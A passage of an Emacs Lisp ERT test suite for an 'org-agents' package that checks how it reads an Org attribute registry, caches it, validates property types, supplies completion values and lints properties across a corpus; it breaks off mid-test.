(defconst org-agents-test--registry-lines '(("OPEN" . 4) ("REVIEWS" . 13)
                                            ("STATUS" . 20))
  "Which line of `org-agents-test--registry-example' each heading is on.
Spelled out rather than computed, because `:line' is what makes a
diagnosis about the registry navigable and a computed expectation would
agree with a reader that had lost count in the same direction.")

(defmacro org-agents-test--with-registry (text &rest body)
  "Run BODY with `registry' bound to a temp registry file holding TEXT.
`org-agents-attributes-file' is that file and every cache the file feeds
is empty -- the declarations, the prototypes read out of its `Prototypes'
section, the id-resolved prototypes, and the table of prototype
diagnostics already said -- so no test can read the developer's own
registry, or a previous test's parse of another one.  Buffers visiting
the file are killed afterwards, because the file is about to be deleted."
  (declare (indent 1))
  `(let* ((dir (make-temp-file "org-agents-registry" t))
          (registry (expand-file-name "attributes.org" dir))
          (org-agents-attributes-file registry)
          (org-agents--attributes-cache nil)
          (org-agents--prototypes-cache nil)
          (org-agents--prototype-id-cache nil)
          (org-agents--prototype-warned nil)
          (org-element-use-cache nil))
     (unwind-protect (progn (with-temp-file registry (insert ,text)) ,@body)
       (dolist (buf (buffer-list))
         (when-let* ((f (buffer-file-name buf)))
           (when (string-prefix-p (file-name-as-directory dir) f)
             (with-current-buffer buf (set-buffer-modified-p nil))
             (kill-buffer buf))))
       (delete-directory dir t))))

(defun org-agents-test--attribute-but-file (name)
  "The declaration of NAME with its `:file' entry taken out.
Every other entry is left in the order the reader wrote it, so one
`equal' asserts the whole plist -- the fields, their values, and that
there is nothing else in it."
  (cl-loop for (key value) on (org-agents-attribute name) by #'cddr
           unless (eq key :file) append (list key value)))

(ert-deftest org-agents-test-attributes-absent-file-is-empty ()
  "A registry that is not there declares nothing, and says nothing about it.
The registry is optional.  A package that reported its absence would
report it at every property completion in every Org buffer, so \"nothing
declared\" has to be the silent answer and not merely the harmless one."
  (let* ((dir (make-temp-file "org-agents-registry" t))
         (org-agents-attributes-file (expand-file-name "nope.org" dir))
         (org-agents--attributes-cache nil))
    (unwind-protect
        (let ((texts (org-agents-test--messages
                       (should-not (org-agents-attributes))
                       (should-not (org-agents-attribute "STATUS")))))
          (should-not texts))
      (delete-directory dir t))))

(ert-deftest org-agents-test-attributes-worked-example ()
  "The three declarations of the shipped example, read field for field.
`OPEN' is the case that matters most: its `:values' are in no drawer at
all.  The reader synthesizes a boolean's two values, so completion needs
no type dispatch and the lint's vocabulary check and its type check are
one check."
  (org-agents-test--with-registry org-agents-test--registry-example
    (should (equal (org-agents-attributes) '("OPEN" "REVIEWS" "STATUS")))
    (should (equal (org-agents-test--attribute-but-file "OPEN")
                   '(:name "OPEN" :type boolean :values ("true" "false")
                           :default "false" :faces nil
                           :doc "Whether this item is still open for comment.\n\nRead by the weekly review agent, and by nothing else."
                           :line 4)))
    (should (equal (org-agents-test--attribute-but-file "REVIEWS")
                   '(:name "REVIEWS" :type number :values nil
                           :default "0" :faces nil
                           :doc "How many times this entry has been through review."
                           :line 13)))
    (should (equal (org-agents-test--attribute-but-file "STATUS")
                   '(:name "STATUS" :type set
                           :values ("open" "wip" "blocked" "done")
                           :default "open"
                           :faces (("blocked" . org-warning)
                                   ("done" . org-done))
                           :doc "Where the item stands.  A set rather than a string: an item may be\nblocked and waiting on review at once."
                           :line 20)))
    ;; The file is named in full, so a diagnosis about the registry can be
    ;; navigated to the same way a corpus finding can.
    (should (equal (plist-get (org-agents-attribute "STATUS") :file)
                   (expand-file-name registry)))
    (pcase-dolist (`(,name . ,line) org-agents-test--registry-lines)
      (should (equal line (plist-get (org-agents-attribute name) :line))))
    ;; A name is looked up as Org matches a property key: case-insensitively.
    (should (equal (org-agents-attribute "status")
                   (org-agents-attribute "STATUS")))
    (should-not (org-agents-attribute "NOSUCH"))))

(ert-deftest org-agents-test-attributes-cache-holds-and-invalidates ()
  "The file is read once per edit -- and an UNSAVED edit is an edit.
This is the whole reason the cache key is composite.  A key built from
`file-attribute-modification-time' alone would go on answering from the
version on disk while the user edited the registry in front of it: the
value just added would not complete until the file was saved, which is
not a behaviour anyone would report as a bug rather than as magic."
  (org-agents-test--with-registry org-agents-test--registry-example
    (let ((reads 0)
          (real (symbol-function 'org-agents--attributes-read)))
      (cl-letf (((symbol-function 'org-agents--attributes-read)
                 (lambda (&rest args) (cl-incf reads) (apply real args))))
        (org-agents-attributes)
        (org-agents-attribute "STATUS")
        (org-agents-attributes)
        (should (= 1 reads))
        (with-current-buffer (find-file-noselect registry)
          (goto-char (point-max))
          (insert "\n* EXTRA\n:PROPERTIES:\n:ATTR_TYPE: string\n:END:\n"))
        (should (buffer-modified-p (find-buffer-visiting registry)))
        (should (org-agents-attribute "EXTRA"))
        (should (= 2 reads))
        (should (member "EXTRA" (org-agents-attributes)))
        (should (= 2 reads))))))

(ert-deftest org-agents-test-attributes-cache-invalidates-on-a-disk-edit ()
  "An edit made with no buffer visiting the registry invalidates too.
The other half of the composite key, and the half the mechanism is
specified in terms of: where nothing is visiting the registry there is no
tick to read, so the key is the file's modification time and size.  This
test never lets a buffer near the file -- `should-not
find-buffer-visiting' says so on both sides of the edit -- which is what
`org-agents-test-attributes-cache-holds-and-invalidates' cannot do, since
its `find-file-noselect' flips the key to its buffer spelling.

Without this the file half is untested: MEASURED, reducing the key to the
file NAME alone left the whole suite green, and left anyone who edits
`~/org/attributes.org' from another Emacs -- or edits it, saves, and
kills the buffer -- completing the pre-edit vocabulary for the rest of
the session."
  (org-agents-test--with-registry "\
* S
:PROPERTIES:
:ATTR_TYPE:   string
:ATTR_VALUES: aaa
:END:
"
    (let ((reads 0)
          (real (symbol-function 'org-agents--attributes-read)))
      (cl-letf (((symbol-function 'org-agents--attributes-read)
                 (lambda (&rest args) (cl-incf reads) (apply real args))))
        (should-not (find-buffer-visiting registry))
        (should (equal '("aaa") (plist-get (org-agents-attribute "S") :values)))
        (should (= 1 reads))
        ;; Rewritten on disk, by nothing that visits it, to a file of the
        ;; very same SIZE: only the modification time separates the two.
        ;; `set-file-times' rather than trusting the clock, because a
        ;; rewrite within one timestamp's resolution would leave the two
        ;; keys equal and this test asserting nothing.
        (with-temp-file registry
          (insert "\
* S
:PROPERTIES:
:ATTR_TYPE:   string
:ATTR_VALUES: bbb
:END:
"))
        (set-file-times registry (time-add (current-time) 10))
        (should-not (find-buffer-visiting registry))
        (should (equal '("bbb") (plist-get (org-agents-attribute "S") :values)))
        (should (= 2 reads))
        ;; And the new answer is itself cached: the edit costs one read,
        ;; not one per look-up afterwards.
        (should (org-agents-attributes))
        (should (= 2 reads))))))

(ert-deftest org-agents-test-attributes-deleted-file-clears-the-cache ()
  "A registry that has been deleted declares nothing, and the cache is emptied.
Answering from the cache after the file went away would be a stale answer
with no way back to a true one: `org-set-property' would go on completing
a vocabulary no file holds, and the lint would go on validating against
declarations nobody could read.  So the unreadable branch CLEARS the
cache rather than answering from it.

`org-agents-test-attributes-absent-file-is-empty' cannot catch this,
because it starts from an empty cache -- the stale branch has nothing to
return there.  MEASURED: making that branch answer `(cdr
org-agents--attributes-cache)' left all of the suite green."
  (org-agents-test--with-registry "\
* S
:PROPERTIES:
:ATTR_TYPE: string
:END:
"
    (should (equal '("S") (org-agents-attributes)))
    (should org-agents--attributes-cache)
    (delete-file registry)
    (let ((texts (org-agents-test--messages
                   (should-not (org-agents-attributes))
                   (should-not (org-agents-attribute "S")))))
      ;; Silently, as an absent registry always is.
      (should-not texts))
    (should-not org-agents--attributes-cache)))

(ert-deftest org-agents-test-attributes-setupfile-is-not-followed ()
  "Reading the registry follows no `#+SETUPFILE:', and so cannot fetch.
Enabling `org-mode' over the text is how the reader gets Org's own
parsing, and `org-mode' collects keywords whatever `org-inhibit-startup'
says.  MEASURED before the keyword was neutralized: a registry naming a
setup file had `org-file-contents' called on it TWICE per read, and Org
routes a URL there through `url-retrieve-synchronously' and a
download-policy prompt -- from inside
`org-property-allowed-value-functions', while the user answers an
`org-set-property' prompt in an unrelated buffer.  A missing local one
messaged from the same place.

Nothing in a setup file could matter here: this reader wants headings and
property drawers, and both are syntax rather than configuration."
  (org-agents-test--with-registry "\
#+SETUPFILE: /no/such/org-agents-setup.org
#+setupfile: /no/such/lower-case.org

* S
:PROPERTIES:
:ATTR_TYPE:   string
:ATTR_VALUES: aaa bbb
:END:
Documented.
"
    (let ((fetched nil)
          (real (symbol-function 'org-file-contents)))
      (cl-letf (((symbol-function 'org-file-contents)
                 (lambda (file &rest args)
                   (push file fetched)
                   (apply real file args))))
        (let ((texts (org-agents-test--messages
                       (should (equal '("aaa" "bbb")
                                      (plist-get (org-agents-attribute "S")
                                                 :values))))))
          (should-not texts))
        (should-not fetched))
      ;; The declaration is read whole, so the neutralized line cost the
      ;; parse nothing -- including the line number of the heading under
      ;; it, which is what makes a diagnosis navigable.
      (should (equal 4 (plist-get (org-agents-attribute "S") :line)))
      (should (equal "Documented."
                     (plist-get (org-agents-attribute "S") :doc))))))

(ert-deftest org-agents-test-attributes-malformed-entry-named-once ()
  "A bad type costs its entry, is named, and is named exactly once.
Once falls out of where the diagnosis is emitted: the READER says it, and
the reader runs at most once per edit however many times the registry is
looked up afterwards.  A re-read after an edit says it again, which is
right -- the user has just been editing the file."
  (org-agents-test--with-registry "\
* GOOD
:PROPERTIES:
:ATTR_TYPE: string
:END:
* BAD
:PROPERTIES:
:ATTR_TYPE: colour
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (org-agents-attribute "GOOD"))
                   (should-not (org-agents-attribute "BAD"))
                   (should (equal '("GOOD") (org-agents-attributes))))))
      (should (= 1 (length texts)))
      (should (string-match-p "BAD" (car texts)))
      (should (string-match-p "colour" (car texts))))))

(ert-deftest org-agents-test-attributes-bad-default-keeps-the-attribute ()
  "A default that does not parse costs the DEFAULT, not the declaration.
Two tiers, and this is the cheap one: an attribute whose type is sound is
worth completing and worth linting against, whatever its default says."
  (org-agents-test--with-registry "\
* DUE
:PROPERTIES:
:ATTR_TYPE: date
:ATTR_DEFAULT: soonish
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (org-agents-attribute "DUE")))))
      (should (= 1 (length texts)))
      (should (string-match-p "DUE" (car texts)))
      (should (string-match-p "soonish" (car texts))))
    (should (eq 'date (plist-get (org-agents-attribute "DUE") :type)))
    (should-not (plist-get (org-agents-attribute "DUE") :default))))

(ert-deftest org-agents-test-attributes-type-table ()
  "Every row of the type table, driven through the public predicate.
The vocabulary argument is what makes one predicate answer for a whole
property value: a `set' member is a `string', so the only thing left to
say about it is whether the declaration admits it."
  (let ((vocabulary '("open" "wip" "blocked" "done")))
    (pcase-dolist
        (`(,type ,value ,values ,expected)
         `((string "anything at all" nil t)
           (string "" nil t)
           (string "open" ,vocabulary t)
           (string "nope" ,vocabulary nil)
           (string "open wip" ,vocabulary nil)
           (number "3" nil t)
           (number "3.5" nil t)
           (number ".5" nil t)
           (number "-3" nil t)
           (number "+3" nil t)
           (number "1e3" nil nil)
           (number "3 4" nil nil)
           (number "" nil nil)
           (number "many" nil nil)
           (boolean "true" nil t)
           (boolean "false" nil t)
           (boolean "True" nil nil)
           (boolean "t" nil nil)
           (boolean "" nil nil)
           (set "open wip" ,vocabulary t)
           (set "open open" ,vocabulary nil)
           (set "nope" ,vocabulary nil)
           (set "" ,vocabulary t)
           (set "open wip" nil t)
           (list "open open" ,vocabulary t)
           (list "wip open" ,vocabulary t)
           (list "nope" ,vocabulary nil)
           (list "" ,vocabulary t)))
      (should (eq (and (org-agents-attribute-valid-p type value values) t)
                  expected)))
    ;; `:ETC' is Org's marker for "these are defaults, other values
    ;; allowed", so a vocabulary carrying it restricts nothing.
    (should (org-agents-attribute-valid-p 'string "nope" '("open" ":ETC")))
    (should (org-agents-attribute-valid-p 'set "open nope" '("open" ":ETC")))
    ;; And it is not itself a value: a set may not repeat, `:ETC' included.
    (should-not (org-agents-attribute-valid-p 'set "open open"
                                              '("open" ":ETC")))))

(ert-deftest org-agents-test-attributes-date-rejects-an-impossible-calendar ()
  "A date must parse AND name a day that exists.
Measured: `org-parse-time-string' reads `[2020-13-45 Xyz]' without
complaint and `[2020-02-30 Sun]' too, so the syntax check alone admits
two dates no calendar has.  The round trip through `encode-time' is what
catches them -- 45/13/2020 comes back as 14/2/2021."
  (dolist (value '("[2020-01-01 Wed]" "<2020-01-01 Wed 10:00>" "2020-01-01"
                   "[2020-01-01]" "<2020-02-29 Sat>"))
    (should (org-agents-attribute-valid-p 'date value)))
  (dolist (value '("[2020-02-30 Sun]" "[2020-13-45 Xyz]" "[2021-02-29 Mon]"
                   "not a date" "" "10:00" "2020"))
    (should-not (org-agents-attribute-valid-p 'date value))))

(ert-deftest org-agents-test-attributes-reserved-section-is-silent ()
  "The one reserved heading declares nothing and is not complained about.
Epic 3 puts its prototypes in a top-level section of this same file.
Reserving the name now is what keeps that epic from having to change this
reader's contract in order to add one heading."
  (org-agents-test--with-registry "\
* Prototypes
** A prototype
:PROPERTIES:
:STATUS: open
:END:
* STATUS
:PROPERTIES:
:ATTR_TYPE: string
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (equal '("STATUS") (org-agents-attributes))))))
      (should-not texts))))

(ert-deftest org-agents-test-attributes-duplicate-first-wins ()
  "A name declared twice keeps its FIRST declaration, and says so once."
  (org-agents-test--with-registry "\
* STATUS
:PROPERTIES:
:ATTR_TYPE: set
:END:
* status
:PROPERTIES:
:ATTR_TYPE: number
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (equal '("STATUS") (org-agents-attributes))))))
      (should (= 1 (length texts)))
      (should (string-match-p "declared twice" (car texts))))
    (should (eq 'set (plist-get (org-agents-attribute "STATUS") :type)))))

(ert-deftest org-agents-test-attributes-heading-must-be-a-property-name ()
  "A heading Org could not read as a property key declares nothing."
  (org-agents-test--with-registry "\
* Ship it
:PROPERTIES:
:ATTR_TYPE: string
:END:
* STATUS
:PROPERTIES:
:ATTR_TYPE: string
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (equal '("STATUS") (org-agents-attributes))))))
      (should (= 1 (length texts)))
      (should (string-match-p "Ship it" (car texts)))
      (should (string-match-p "not a property name" (car texts))))))

(ert-deftest org-agents-test-attributes-faces-parsed-not-applied ()
  "`:ATTR_FACES:' is parsed and STORED, and nothing here applies it.
Epic 4 is what consumes it.  Reading it now costs nothing and means the
registry file's format does not have to change to gain a feature.

`PARTIAL' is the case that pays for the all-or-nothing rule: a value
whose LAST group is short parses into pairs perfectly well, and a reader
that kept them would silently drop the group it could not read.  Naming
the whole line unreadable is what makes that visible."
  (org-agents-test--with-registry "\
* STATUS
:PROPERTIES:
:ATTR_TYPE:  set
:ATTR_FACES: blocked org-warning | done org-done
:END:
* BROKEN
:PROPERTIES:
:ATTR_TYPE:  string
:ATTR_FACES: blocked
:END:
* PARTIAL
:PROPERTIES:
:ATTR_TYPE:  string
:ATTR_FACES: blocked org-warning | done
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (org-agents-attribute "BROKEN"))
                   (should (org-agents-attribute "PARTIAL")))))
      (should (= 2 (length texts)))
      (dolist (name '("BROKEN" "PARTIAL"))
        (should (cl-find-if (lambda (text)
                              (and (string-match-p name text)
                                   (string-match-p "unreadable :ATTR_FACES:"
                                                   text)))
                            texts))))
    (should (equal '(("blocked" . org-warning) ("done" . org-done))
                   (plist-get (org-agents-attribute "STATUS") :faces)))
    (should-not (plist-get (org-agents-attribute "BROKEN") :faces))
    (should-not (plist-get (org-agents-attribute "PARTIAL") :faces))
    (should (eq 'string (plist-get (org-agents-attribute "BROKEN") :type)))
    (should (eq 'string (plist-get (org-agents-attribute "PARTIAL") :type)))))

(ert-deftest org-agents-test-attributes-special-property-is-named ()
  "A declaration Org's own vocabulary already owns is kept, and named.
Fourteen names never reach `org-property-allowed-value-functions' at all
-- `org-property-get-allowed-values' answers for them in clauses above
the hook -- so completion for one of them is impossible however it is
declared.  The declaration is still worth keeping: the lint reads it."
  (org-agents-test--with-registry "\
* TAGS
:PROPERTIES:
:ATTR_TYPE: list
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (org-agents-attribute "TAGS")))))
      (should (= 1 (length texts)))
      (should (string-match-p "TAGS" (car texts)))
      (should (string-match-p "special property" (car texts))))))

(ert-deftest org-agents-test-attributes-empty-drawer-field-is-no-field ()
  "A field written with nothing after it means the field is not there.
`org-agents--entry-get' is what says so, and it says it for the registry
in the same words it says it for an agent's properties."
  (org-agents-test--with-registry "\
* STATUS
:PROPERTIES:
:ATTR_TYPE:    string
:ATTR_DEFAULT:
:ATTR_VALUES:
:ATTR_FACES:
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (org-agents-attribute "STATUS")))))
      (should-not texts))
    (should-not (plist-get (org-agents-attribute "STATUS") :default))
    (should-not (plist-get (org-agents-attribute "STATUS") :values))
    (should-not (plist-get (org-agents-attribute "STATUS") :faces))
    ;; And no body is no documentation, rather than an empty string.
    (should-not (plist-get (org-agents-attribute "STATUS") :doc))))

(ert-deftest org-agents-test-attributes-doc-stops-at-a-child-heading ()
  "A declaration documents itself rather than quoting its children.
The `:doc' body ends at the next heading of ANY level, and not at the end
of the subtree.  A `** Examples' under a declaration is the obvious thing
an author writes, and Epic 3 puts prototype entries under top-level
sections of this same file -- so the difference is not hypothetical.

MEASURED: bounding the body at `org-end-of-subtree' instead left the
whole suite green while `:doc' became \"My own docs.\\n** Notes\\nChild
prose...\" -- the children's raw Org text, carried into whatever
displays it."
  (org-agents-test--with-registry "\
* S
:PROPERTIES:
:ATTR_TYPE: string
:END:
My own docs.

** Notes
Child prose that is not S's documentation.

*** Deeper
Nor is this.
* T
:PROPERTIES:
:ATTR_TYPE: number
:END:
"
    (should (equal "My own docs." (plist-get (org-agents-attribute "S") :doc)))
    ;; And a declaration whose next line is the next heading has no body
    ;; at all, rather than the text of what follows it.
    (should-not (plist-get (org-agents-attribute "T") :doc))
    ;; The child headings declare nothing: only level-1 entries do.
    (should (equal '("S" "T") (org-agents-attributes)))))

(ert-deftest org-agents-test-attributes-boolean-values-are-not-declared ()
  "`:ATTR_VALUES:' on a boolean is named, and the pair still stands."
  (org-agents-test--with-registry "\
* OPEN
:PROPERTIES:
:ATTR_TYPE:   boolean
:ATTR_VALUES: yes no
:END:
"
    (let ((texts (org-agents-test--messages
                   (should (org-agents-attribute "OPEN")))))
      (should (= 1 (length texts)))
      (should (string-match-p "no meaning for a boolean" (car texts))))
    (should (equal '("true" "false")
                   (plist-get (org-agents-attribute "OPEN") :values)))))

(ert-deftest org-agents-test-attributes-no-type-is-no-declaration ()
  "A top-level entry with no `:ATTR_TYPE:' is skipped, and named.
Which is exactly what catches the trap in this file format: Org reads a
property drawer only from immediately under the heading, so a drawer
written after the body text is not a property drawer at all and the entry
looks, correctly, like one that declares no type."
  (org-agents-test--with-registry "\
* LATE
Documentation first, drawer after -- which Org does not read.
:PROPERTIES:
:ATTR_TYPE: string
:END:
"
    (let ((texts (org-agents-test--messages
                   (should-not (org-agents-attributes)))))
      (should (= 1 (length texts)))
      (should (string-match-p "LATE" (car texts)))
      (should (string-match-p "no :ATTR_TYPE:" (car texts))))))

;; Completion from the registry.  Every test here drives
;; `org-property-get-allowed-values' rather than the package's own
;; function alone: what matters is not what the hook function answers but
;; what Org does with the answer, and two of the five rules below are
;; about the CLAUSE the hook sits in rather than about the hook.
;;
;; The hook is installed by `let' and never by `add-hook', so no test
;; here can leak into the one after it -- or into a developer's session,
;; where `make test' runs in the same process as everything else.

(defmacro org-agents-test--with-completion (text drawer &rest body)
  "Run BODY at a heading whose drawer holds DRAWER, against registry TEXT.
`org-agents-allowed-values' is the only function on
`org-property-allowed-value-functions', which is bound rather than added
to, and point is on the heading."
  (declare (indent 2))
  `(org-agents-test--with-registry ,text
     (with-temp-buffer
       (let ((org-property-allowed-value-functions
              (list #'org-agents-allowed-values))
             (org-use-property-inheritance nil))
         (insert "* Entry\n:PROPERTIES:\n" ,drawer ":END:\n")
         (org-mode)
         (goto-char (point-min))
         ,@body))))

(ert-deftest org-agents-test-allowed-values-declared-set ()
  "A declared vocabulary is what `org-set-property' completes.
The `table' form is asserted too, because that is the form
`org-read-property-value' actually asks for on the way to the prompt."
  (org-agents-test--with-completion org-agents-test--registry-example ""
    (should (equal (org-property-get-allowed-values (point) "STATUS")
                   '("open" "wip" "blocked" "done")))
    (should (equal (org-property-get-allowed-values (point) "STATUS" 'table)
                   '(("open") ("wip") ("blocked") ("done"))))))

(ert-deftest org-agents-test-allowed-values-leave-undeclared-alone ()
  "An undeclared name is not answered for, and its `_ALL' still wins.
`org-property-get-allowed-values' consults this hook in a clause ABOVE
the one that reads `NAME_ALL', so ANY non-nil answer shadows every `_ALL'
declaration in the corpus for that name.  Measured: a hook answering for
`STATUS' beat a `:STATUS_ALL: a b c' in the entry's own drawer.  Leaving
an undeclared name alone therefore means answering nil, not answering
something harmless."
  (org-agents-test--with-completion org-agents-test--registry-example
      ":NOPE_ALL: a b c\n"
    (should-not (org-agents-allowed-values "NOPE"))
    (should (equal (org-property-get-allowed-values (point) "NOPE")
                   '("a" "b" "c")))))

(ert-deftest org-agents-test-allowed-values-declared-without-values-defers ()
  "A declaration carrying no vocabulary defers to `NAME_ALL' as well.
The empty list is not an answer here, it is the absence of one: returning
`\\='()' as though it were an answer would silently disable every `_ALL'
declaration in the corpus for a name the registry merely gave a type."
  (org-agents-test--with-completion "\
* STATUS
:PROPERTIES:
:ATTR_TYPE: string
:END:
"
      ":STATUS_ALL: a b c\n"
    (should (org-agents-attribute "STATUS"))
    (should-not (org-agents-allowed-values "STATUS"))
    (should (equal (org-property-get-allowed-values (point) "STATUS")
                   '("a" "b" "c")))))

(ert-deftest org-agents-test-allowed-values-etc-alone-defers ()
  "A vocabulary of `:ETC' and nothing else is not an answer either.
`:ETC' is Org's marker for \"these are defaults, other values are allowed
too\", so a vocabulary that HAS members and ends in `:ETC' is answered
and left open -- the control below.  Alone it is a declaration of
openness with no defaults in it, and MEASURED, answering it does the one
thing this hook must never do: `org-property-get-allowed-values' removes
`:ETC' from the list and is left with an empty one, so the prompt offers
nothing at all -- while the non-nil answer has already shadowed the
`NAME_ALL' declaration that would have supplied the corpus's own values."
  (org-agents-test--with-completion "\
* S
:PROPERTIES:
:ATTR_TYPE:   string
:ATTR_VALUES: :ETC
:END:
"
      ":S_ALL: aa bb\n"
    (should (equal '(":ETC") (plist-get (org-agents-attribute "S") :values)))
    (should-not (org-agents-allowed-values "S"))
    (should (equal (org-property-get-allowed-values (point) "S")
                   '("aa" "bb"))))
  ;; The control: with a member beside it, `:ETC' is answered and carries
  ;; the `org-unrestricted' property Org puts there, which is what
  ;; `org-read-property-value' reads REQUIRE-MATCH off.
  (org-agents-test--with-completion "\
* S
:PROPERTIES:
:ATTR_TYPE:   string
:ATTR_VALUES: open :ETC
:END:
"
      ":S_ALL: aa bb\n"
    (should (equal '("open" ":ETC") (org-agents-allowed-values "S")))
    (let ((values (org-property-get-allowed-values (point) "S")))
      (should (equal '("open") values))
      (should (get-text-property 0 'org-unrestricted (car values))))))

(ert-deftest org-agents-test-allowed-values-boolean-two-values ()
  "A boolean completes to its two values, with no type dispatch here.
The READER synthesizes them onto the declaration, which is why this
function has no branch for the type at all."
  (org-agents-test--with-completion org-agents-test--registry-example ""
    (should (equal (org-property-get-allowed-values (point) "OPEN")
                   '("true" "false")))))

(ert-deftest org-agents-test-allowed-values-set-and-list-complete-per-member ()
  "A set and a list complete their MEMBERS, not their whole vocabulary.
Completing one member of a whitespace-separated value is what the value
is written one member at a time, so the members are what the answer holds."
  (org-agents-test--with-completion "\
* TOPICS
:PROPERTIES:
:ATTR_TYPE:   list
:ATTR_VALUES: emacs org lisp
:END:
* STATUS
:PROPERTIES:
:ATTR_TYPE:   set
:ATTR_VALUES: open wip
:END:
" ""
    (should (equal (org-property-get-allowed-values (point) "TOPICS")
                   '("emacs" "org" "lisp")))
    (should (equal (org-property-get-allowed-values (point) "STATUS")
                   '("open" "wip")))))

(ert-deftest org-agents-test-allowed-values-are-fresh-copies ()
  "The answer is freshly copied strings, because Org writes on them.
MEASURED, and this is the sharpest edge in the whole feature.  Where the
vocabulary ends in `:ETC', `org-property-get-allowed-values' calls
`org-add-props' on the first string of the list it was handed, and
`org-add-props' adds text properties IN PLACE.  A hook that returned its
own cached list left `(org-unrestricted t)' on that list's first string
for the rest of the session -- so every later completion of that
property, and every value comparison against it, carried a property
nobody put there."
  (org-agents-test--with-completion "\
* STATUS
:PROPERTIES:
:ATTR_TYPE:   string
:ATTR_VALUES: open wip :ETC
:END:
" ""
    ;; `:ETC' is passed through, not filtered: it is what makes a declared
    ;; vocabulary stay OPEN at the prompt, since `org-read-property-value'
    ;; reads REQUIRE-MATCH off the `org-unrestricted' property `:ETC' is
    ;; what puts there.
    (should (member ":ETC" (org-agents-allowed-values "STATUS")))
    (let ((answer (org-property-get-allowed-values (point) "STATUS"))
          (cached (plist-get (org-agents-attribute "STATUS") :values)))
      (should (equal '("open" "wip") answer))
      ;; Org wrote on the list it was handed -- it always will, and that
      ;; is the answer's business.  What matters is WHOSE strings those
      ;; are: not the cache's, so the writing lands on a copy.
      (should (text-properties-at 0 (car answer)))
      (should-not (memq (car answer) cached)))
    ;; So the cache is still exactly what the file spelled, `:ETC' and
    ;; all, however many times it has been completed against.
    (org-property-get-allowed-values (point) "STATUS")
    (org-property-get-allowed-values (point) "STATUS")
    (let ((cached (plist-get (org-agents-attribute "STATUS") :values)))
      (should (equal '("open" "wip" ":ETC") cached))
      (dolist (value cached)
        (should-not (text-properties-at 0 value))))))

;; `org-agents-check-attributes'.  It REPORTS and never edits, so every
;; test here that touches a corpus also says the corpus came out
;; unchanged, and the one that says it loudest is
;; `org-agents-test-check-attributes-never-edits'.

(defmacro org-agents-test--with-attr-corpus (registry corpus &rest body)
  "Run BODY over a temp CORPUS with REGISTRY declaring its attributes.
CORPUS is an alist of `(RELATIVE-NAME . TEXT)'.  `dir' is the corpus root
and `org-directory' is it; `files' holds the absolute names in CORPUS's
order, `F' maps a relative name to its absolute one, and
`org-agenda-files' is `files' so that the `agenda' scope reaches this
corpus and nothing else.

`dir' deliberately SHADOWS the registry directory that
`org-agents-test--with-registry' binds under the same name: the registry
lives outside the corpus, so that a test which lints `all' does not lint
the registry file, and the corpus root is the `dir' a test body wants.
`registry' still names the registry file."
  (declare (indent 2))
  `(org-agents-test--with-registry ,registry
     (let* ((dir (make-temp-file "org-agents-attr-corpus" t))
            (org-directory dir)
            (F (lambda (name) (expand-file-name name dir)))
            (org-use-property-inheritance nil)
            (org-element-use-cache nil)
            (org-id-track-globally nil)
            (org-id-locations (make-hash-table :test #'equal))
            (org-id-files nil)
            (org-agents-prefilter 'auto)
            ;; No timeout, for the reason
            ;; `org-agents-test--with-rg-corpus-unguarded' gives: this
            ;; fixture now spawns ripgrep for the attribute census, and a
            ;; spurious expiry would send a test that is about the CENSUS
            ;; down the live walk and quietly assert nothing about it.
            (org-agents-rg-timeout nil)
            (files nil))
       (ignore F)
       (unwind-protect
           (progn
             (pcase-dolist (`(,name . ,text) ,corpus)
               (let ((file (expand-file-name name dir)))
                 (make-directory (file-name-directory file) t)
                 (with-temp-file file (insert text))
                 (setq files (nconc files (list file)))))
             (let ((org-agenda-files files))
               ,@body))
         (dolist (buf (buffer-list))
           (when-let* ((f (buffer-file-name buf)))
             (when (string-prefix-p (file-name-as-directory dir) f)
               (with-current-buffer buf (set-buffer-modified-p nil))
               (kill-buffer buf))))
         (delete-directory dir t)))))

(defconst org-agents-test--attr-findings-corpus
  '(("a.org" . "\
* Entry
:PROPERTIES:
:STATUS: nope
:REVIEWS: many
:WIDGET: x
:END:
"))
  "One entry carrying one of each of the three kinds of finding.
`:STATUS:' is declared and its value is outside the vocabulary,
`:REVIEWS:' is declared and its value is not a number, and `:WIDGET:' is
not declared at all.  The three sit on lines 3, 4 and 5, which is what
the report has to say.")

(defun org-agents-test--attr-report-lines ()
  "The lines of the report buffer, and nothing else."
  (with-current-buffer org-agents--attributes-buffer
    (split-string (buffer-substring-no-properties (point-min) (point-max))
                  "\n" t)))

(defun org-agents-test--attr-finding-lines ()
  "The report lines that are findings -- `FILE:LINE: TEXT' and no other."
  (cl-remove-if-not (lambda (line) (string-match-p "\\`/.*:[0-9]+: " line))
                    (org-agents-test--attr-report-lines)))

(ert-deftest org-agents-test-check-attributes-finds-each-kind ()
  "One finding per kind, each at its own line, each navigable.
The line SHAPE is load-bearing and is asserted as such: with the findings
written `FILE:LINE: TEXT', `compilation-mode' parses every one of them --
MEASURED, 3 of 3 -- so `RET', `next-error' and `M-g n' all work in this
buffer with nothing written for them."
  (org-agents-test--with-attr-corpus org-agents-test--registry-example
      org-agents-test--attr-findings-corpus
    (org-agents-check-attributes files)
    (let ((lines (org-agents-test--attr-finding-lines)))
      (should (= 3 (length lines)))
      (should (string-match-p (format "\\`%s:3: " (regexp-quote (car files)))
                              (nth 0 lines)))
      (should (string-match-p "STATUS" (nth 0 lines)))
      (should (string-match-p "nope" (nth 0 lines)))
      (should (string-match-p "open wip blocked done" (nth 0 lines)))
      (should (string-match-p (format "\\`%s:4: " (regexp-quote (car files)))
                              (nth 1 lines)))
      (should (string-match-p "REVIEWS" (nth 1 lines)))
      (should (string-match-p "is not a number" (nth 1 lines)))
      (should (string-match-p (format "\\`%s:5: " (regexp-quote (car files)))
                              (nth 2 lines)))
      (should (string-match-p "WIDGET" (nth 2 lines)))
      (should (string-match-p "not declared" (nth 2 lines))))
    ;; And every one of them is a `compilation-mode' error, which is what
    ;; makes the buffer navigable without a line of navigation code.
    (with-current-buffer org-agents--attributes-buffer
      (should (derived-mode-p 'compilation-mode))
      (compilation--ensure-parse (point-max))
      (goto-char (point-min))
      (let ((parsed 0))
        (while (not (eobp))
          (when (get-text-property (line-beginning-position)
                                   'compilation-message)
